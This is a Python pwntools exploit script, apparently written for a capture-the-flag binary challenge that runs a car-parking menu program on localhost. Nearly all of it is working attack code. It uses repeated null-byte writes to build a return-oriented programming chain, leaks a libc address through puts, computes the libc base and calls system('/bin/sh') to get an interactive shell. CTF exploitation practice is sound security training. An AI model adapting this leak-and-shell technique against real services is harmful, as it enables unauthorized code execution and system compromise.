#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11103 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 11103)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x0000000000401396
b *0x0000000000401363
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  '.'


io = start()

sla = io.sendlineafter
sa = io.sendafter

def park_car(idx,buf):
    sla(b": ",b"1")
    sla(b": ",str(idx).encode())
    sa(b": ",buf)

def remove_car(idx):
    sla(b": ",b"2")
    sla(b": ",str(idx).encode())

def make_null(length):
    for i in range(length,length-9,-1):
        park_car(9,b"a"*i+b"\x00")
        remove_car(9)

def send_payload(pay):

    for i in range(len(pay)-1,-1,-1):
        make_null(48+i*8-1)
        p = b'a'*40
        p += b'a'*(i*8)
        p += p64(pay[i])
        park_car(9,p)
        remove_car(9)


pop_rdi = 0x0000000000401653


libc = exe.libc
libc =ELF('./libc.so.6')
p = [pop_rdi, exe.got['puts'],exe.sym['puts'],exe.sym['main']]
send_payload(p)
sla(b": ",b"4")
io.recvline()
leak = u64(io.recv(6)+b"\x00\x00")
libc.address = leak - libc.sym['puts']
print(hex(libc.address))
p = [pop_rdi+1,pop_rdi, next(libc.search(b"/bin/sh\x00")),libc.sym['system']]
send_payload(p)
sla(b": ",b"4")
io.interactive()

